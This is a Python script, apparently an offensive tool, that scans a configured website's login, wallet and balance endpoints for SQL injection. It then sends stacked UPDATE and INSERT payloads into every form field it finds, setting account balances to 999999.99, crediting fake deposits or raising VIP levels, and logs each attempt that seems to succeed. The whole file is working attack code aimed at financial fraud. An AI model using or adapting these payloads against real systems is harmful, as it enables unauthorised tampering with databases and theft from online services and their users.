import httpx
import re
from urllib.parse import urljoin
from utils.helpers import save_to_output
from config.config_loader import load_config
import logging
import json
from typing import List

logger = logging.getLogger(__name__)
logging.basicConfig(filename='logs/bruteforce.log', level=logging.INFO, format='[%(asctime)s] %(message)s')

class SQLInjector:
    def __init__(self):
        self.config = load_config()
        self.session = httpx.Client(proxies=self.config.get("proxy", None), verify=False, timeout=15)
        self.balance_payloads = [
            "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
            "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
            "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
            "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
            "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
            "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
            "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
            "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --"
        ]
        self.vulnerable_endpoints = []
        self.successful_injections = []

    def detect_vulnerable_fields(self, base_url: str) -> List[str]:
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        endpoints = [
            "/admin/login", "/api/auth/login", 
            "/api/user/profile", "/api/user/balance",
            "/api/wallet/update", "/api/transactions"
        ]
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            try:
                test_payload = "' OR '1'='1"
                response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
                if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql"]):
                    self.vulnerable_endpoints.append(full_url)
                    logger.info(f"[VULNERÁVEL] {full_url}")
            except Exception as e:
                logger.error(f"Erro ao testar endpoint {full_url}: {e}")
        return self.vulnerable_endpoints

    def simulate_balance_injection(self, target_url: str, userid: int = 1):
        logger.info(f"💰 Iniciando injeções de saldo em: {target_url}")
        for payload in self.balance_payloads:
            try:
                injection_attempts = [
                    {"username": payload, "password": "test"},
                    {"user": payload, "pass": "test"},
                    {"token": payload},
                    {"auth": payload},
                    {"balance": payload}
                ]
                for data in injection_attempts:
                    response = self.session.post(target_url, data=data)
                    success_markers = [
                        "success", "balance updated", "transaction complete",
                        "200 OK", "changes saved", "account modified"
                    ]
                    if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                        injection_info = {
                            "url": target_url,
                            "payload": payload,
                            "data": data,
                            "response_code": response.status_code
                        }
                        self.successful_injections.append(injection_info)
                        logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {payload}")
                        safe_write_file("output/successful_injections.txt", json.dumps(injection_info))
            except Exception as e:
                logger.error(f"Erro na injeção {payload}: {e}")

    def analyze_endpoint(self, url):
        """Analisa o endpoint para identificar campos e métodos possíveis."""
        try:
            resp = self.session.get(url)
            # Tenta identificar campos de formulário comuns
            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
            campos_unicos = list(set(campos))
            logger.info(f"Campos identificados em {url}: {campos_unicos}")
            return campos_unicos
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {url}: {e}")
            return []

    def smart_injection_attempts(self, url, campos):
        """Tenta injeção em todos os campos identificados, além dos padrões."""
        for payload in self.balance_payloads:
            data_variants = []
            # Tenta injetar em cada campo identificado
            for campo in campos:
                data = {campo: payload}
                data_variants.append(data)
            # Adiciona variantes padrões
            data_variants.extend([
                {"username": payload, "password": "test"},
                {"user": payload, "pass": "test"},
                {"token": payload},
                {"auth": payload},
                {"balance": payload}
            ])
            for data in data_variants:
                try:
                    response = self.session.post(url, data=data)
                    success_markers = [
                        "success", "balance updated", "transaction complete",
                        "200 OK", "changes saved", "account modified"
                    ]
                    if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                        injection_info = {
                            "url": url,
                            "payload": payload,
                            "data": data,
                            "response_code": response.status_code
                        }
                        self.successful_injections.append(injection_info)
                        logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {payload}")
                        save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                except Exception as e:
                    logger.error(f"Erro na injeção {payload} em {url}: {e}", exc_info=True)

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return
        vulnerable = self.detect_vulnerable_fields(base_url)
        if not vulnerable:
            logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
            return
        for url in vulnerable:
            campos = self.analyze_endpoint(url)
            self.smart_injection_attempts(url, campos)
        if self.successful_injections:
            report = {
                "target": base_url,
                "vulnerable_endpoints": vulnerable,
                "successful_injections": self.successful_injections,
                "total_success": len(self.successful_injections)
            }
            save_to_output("sql_injection_report.json", json.dumps(report, indent=2))
            logger.info(f"📊 Relatório gerado com {len(self.successful_injections)} injeções bem sucedidas")

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()